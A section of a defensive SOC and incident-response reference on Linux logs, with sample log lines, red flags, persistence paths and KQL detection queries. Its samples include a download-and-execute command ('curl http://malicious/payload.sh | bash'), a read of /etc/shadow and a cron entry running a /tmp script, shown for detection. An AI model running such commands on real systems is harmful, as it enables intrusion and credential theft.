# **Section 6 — Linux Logs**
_Comprehensive SOC, DFIR & Threat Hunting Reference_

Linux systems are core components in servers, cloud platforms, containers, web services, and critical infrastructure.  
Attackers frequently target Linux systems for persistence, credential access, privilege escalation, and lateral movement.

This section covers all major Linux logs used in SOC and DFIR investigations:

- `auth.log`
- `syslog`
- `auditd`
- `sudo` logs
- `sshd` logs
- persistence indicators
- attacker behavior patterns
- SIEM detection queries

---

# 🧭 **TABLE OF CONTENTS**
- [Overview of Linux Logging](#-overview-of-linux-logging)
- [Authentication Logs — authlog](#-authentication-logs--authlog)
  - [SSH Login Success](#-ssh-login-success)
  - [SSH Failed Login](#-ssh-failed-login)
  - [Privilege Escalation (sudo)](#-privilege-escalation-sudo)
- [System Logs — syslog](#-system-logs--syslog)
- [auditd — Deep Forensics Logging](#-auditd--deep-forensics-logging)
  - [EXECVE — Command Execution](#-execve--command-execution)
  - [SYSCALL — System Calls](#-syscall--system-calls)
  - [PATH — File Access](#-path--file-access)
  - [USER_ACCT, USER_CMD](#-user_acct-user_cmd)
- [sshd logs](#-sshd-logs)
- [Persistence Indicators](#-persistence-indicators)
- [SIEM Detection Queries](#-siem-detection-queries)

---

# ---
# ## **Overview of Linux Logging**

Linux does not have a single centralized event log like Windows.  
Instead, logs are distributed across multiple locations:

### **Primary log locations**
```
/var/log/auth.log
/var/log/syslog
/var/log/audit/audit.log
/var/log/messages
/var/log/secure
```

Depending on distribution:
- Debian-based → `auth.log`, `syslog`
- RHEL/CentOS → `secure`, `messages`

---

# ---
# ## **Authentication Logs — auth.log**

Authentication logs track:
- SSH logins  
- sudo usage  
- su attempts  
- PAM authentication  
- account lockouts  

This is one of the most important logs in Linux security.

---

# ##
# ### **SSH Login Success**
When SSH login succeeds:

Example:
```
Accepted password for root from 185.212.44.23 port 50322 ssh2
```

### **Why It Matters**
Indicators of:
- brute-force success  
- compromised password  
- unauthorized remote access  
- lateral movement  

### **Red Flags**
- Successful root login over SSH  
- Success after multiple failures  
- Logins from foreign countries  
- Accounts not normally using SSH  

### **MITRE ATT&CK**
- **T1078 — Valid Accounts**  
- **T1021.004 — SSH Lateral Movement**

---

# ###
# ### **SSH Failed Login**
Example:
```
Failed password for invalid user admin from 185.73.91.12 port 42444 ssh2
```

### **Why It Matters**
Usually indicates:
- brute-force attacks  
- password spraying  
- reconnaissance attempts  

### **Red Flags**
- Dozens/hundreds of failed attempts  
- Attempts against multiple users  
- Attempts against non-existing accounts (admin, test, guest)  

### **Attack Pattern Example**
```
Invalid user oracle
Invalid user ubuntu
Invalid user postgres
```

Attackers try common usernames.

---

# ---
# ## **Privilege Escalation (sudo)**

Successful sudo:
```
sudo: john : TTY=pts/0 ; PWD=/home/john ; RUNNING AS root ; COMMAND=/usr/bin/apt update
```

Failed sudo:
```
sudo: pam_unix(sudo:auth): authentication failure; logname=john uid=1001
```

### **MITRE ATT&CK**
- **T1068 — Privilege Escalation**
- **T1134 — Access Token Manipulation**

### **Red Flags**
- Users using sudo who normally don't  
- Repeated sudo failures  
- sudo launching suspicious binaries  
- sudo used from unusual paths (e.g. /tmp malware)  

---

# ---
# ## **System Logs — syslog**

Contains general OS information:
- service start/stop  
- kernel messages  
- cron jobs  
- network events  
- daemon issues  

Example:
```
systemd[1]: Started OpenSSH Daemon.
systemd[1]: Created slice User Slice of UID 1001.
```

### **SOC Relevance**
- detect persistence (cron jobs, systemd services)  
- detect malicious service creation  
- detect abnormal user activity  

---

# ---
# ## **auditd — Deep Forensics Logging**
`auditd` is the most powerful logging mechanism in Linux.  
It provides detailed telemetry for DFIR investigations.

### **auditd captures:**
- every command executed  
- every file accessed  
- every permission change  
- every privilege escalation attempt  
- every authentication attempt  
- network-related syscalls  

---

# ###
# ### **EXECVE — Command Execution**

Example:
```
type=EXECVE msg=audit(1675523424.123:345): argc=3 a0="bash" a1="-c" a2="curl http://malicious/payload.sh | bash"
```

### **Why It Matters**
Captures:
- malware download commands  
- reverse shells  
- script execution  
- enumeration activities  

### **MITRE ATT&CK**
- **T1059 — Command Execution**

### **Red Flags**
- curl/wget downloading external scripts  
- bash executing piped commands  
- execution from `/tmp` or `/dev/shm`  
- unusual interpreters (python, ruby, perl)  

---

# ###
# ### **SYSCALL — System Calls**

System call logs show:
- file modifications  
- process creation  
- privilege escalation  

Example:
```
type=SYSCALL msg=audit(1675523490.456:350): arch=c000003e syscall=59 success=yes exe="/bin/bash"
```

### **Why It Matters**
Allows extremely detailed forensic reconstruction.

---

# ###
# ### **PATH — File Access**

Shows files touched by processes.

Example:
```
type=PATH item=0 name="/tmp/backdoor" inode=123456 dev=08:01 mode=0100755
```

### **Red Flags**
- File creation in `/tmp`, `/var/tmp`, `/dev/shm`  
- Executable permissions set (chmod +x)  
- Dropped binaries by suspicious users  

---

# ###
# ## **USER_ACCT / USER_CMD**

### USER_ACCT
Tracks user authentication events.

### USER_CMD
Tracks commands executed via sudo.

Example:
```
USER_CMD pid=2234 uid=0 auid=1001 cmd="cat /etc/shadow"
```

### **Red Flag**
Non-root user reading `/etc/shadow`.

---

# ---
# ## **sshd Logs**
sshd logs provide visibility into:
- key exchange  
- authentication  
- connection attempts  
- session closures  

Examples:

**Connection established**
```
Connection from 192.168.1.15 port 44522
```

**Key-based login**
```
Accepted publickey for ubuntu from 10.0.5.12 port 55233 ssh2
```

### **Red Flags**
- Login using unexpected SSH keys  
- Users logging in during abnormal hours  
- Session opened + closed immediately (bruteforce testing)  
- Reverse tunnels (SSH -R / SSH -L)  

---

# ---
# ## **Persistence Indicators**

Attackers maintain persistence on Linux by:

### **1️⃣ cron jobs**
```
/etc/crontab
/etc/cron.hourly
/etc/cron.daily
/etc/cron.d
```

Suspicious example:
```
* * * * * root /tmp/update.sh
```

### **2️⃣ Systemd services**
```
/etc/systemd/system/backdoor.service
```

### **3️⃣ SSH authorized_keys injection**
```
~/.ssh/authorized_keys
```

### **4️⃣ Startup scripts**
```
/etc/rc.local
/etc/profile
~/.bashrc
~/.bash_profile
```

### **5️⃣ Hidden files**
```
/tmp/.x
/home/user/.cache/.system
```

---

# ---
# ## **SIEM Detection Queries**

### **KQL — Detect SSH Brute Force**
```kql
LinuxAuth
| where Message contains "Failed password"
| summarize Attempts=count() by SourceIP
| where Attempts > 5
```

### **KQL — Detect Successful SSH from Rare IP**
```kql
LinuxAuth
| where Message contains "Accepted"
| summarize count() by SourceIP, User
| where count_ < 3
```

### **KQL — Detect Commands Downloading Scripts**
```kql
LinuxAudit
| where EventID == "EXECVE"
| where Command has_any ("curl","wget")
```

### **KQL — Detect Execution from /tmp**
```kql
LinuxAudit
| where EventID == "EXECVE"
| where Command contains "/tmp"
```

### **KQL — Detect Unauthorized sudo Access**
```kql
LinuxAuth
| where Message contains "sudo" and Message contains "authentication failure"
```

### **KQL — Detect unauthorized modification of .ssh keys**
```kql
LinuxAudit
| where FilePath contains "/.ssh/authorized_keys"
```

---

# 🎯 **End of Section 6**
This section provides essential SOC-level detection coverage for Linux authentication, system behavior, auditd telemetry, privilege escalation, and persistence techniques.

---

### ➡️ Next: [Section 7 — Network Logs](./07_network_logs.md)
